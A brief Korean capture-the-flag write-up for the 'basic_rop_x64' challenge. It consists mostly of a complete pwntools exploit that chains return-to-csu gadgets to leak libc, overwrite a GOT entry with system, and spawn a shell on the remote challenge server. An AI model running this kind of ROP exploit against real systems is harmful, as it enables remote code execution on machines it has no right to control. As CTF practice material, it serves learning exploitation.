# basic_rop_x64

64bit 바이너리를 rop를 이용해서 푸는 문제이다.   
가젯을 찾아보니 부족해서 RTC 기법을 이용해서 해결했다.   
<br/>

아래와 같이 코드를 작성해주었다.   
```
from pwn import *

p = remote("host1.dreamhack.games", 13574)

e = ELF('./basic_rop_x64')
libc = ELF('./libc.so.6')

read_offset = libc.symbols['read']
system_offset = libc.symbols['system']

read_plt = e.plt['read']
read_got = e.got['read']

write_plt = e.plt['write']
write_got = e.got['write']

csu_pop = 0x40087a
csu_call = 0x400860

bss = e.bss()

payload = ''
payload += 'A'*0x40
payload += 'A'*0x8 #sfp

payload += p64(csu_pop)
payload += p64(0)
payload += p64(1)
payload += p64(write_got)
payload += p64(8)
payload += p64(read_got)
payload += p64(1)
payload += p64(csu_call)

payload += 'B'*8
payload += p64(0)
payload += p64(1)
payload += p64(read_got)
payload += p64(8)
payload += p64(bss)
payload += p64(0)
payload += p64(csu_call)

payload += 'B'*8
payload += p64(0)
payload += p64(1)
payload += p64(read_got)
payload += p64(8)
payload += p64(write_got)
payload += p64(0)
payload += p64(csu_call)

payload += 'B'*8
payload += p64(0)
payload += p64(1)
payload += p64(write_got)
payload += p64(0)
payload += p64(0)
payload += p64(bss)
payload += p64(csu_call)

p.send(payload)

sleep(1)

p.recv(0x40)
read_addr = u64(p.recv(0x8))
libc_addr = read_addr - read_offset
system_addr = libc_addr + system_offset

p.send("/bin/sh\x00")
p.send(p64(system_addr))

p.interactive()
```

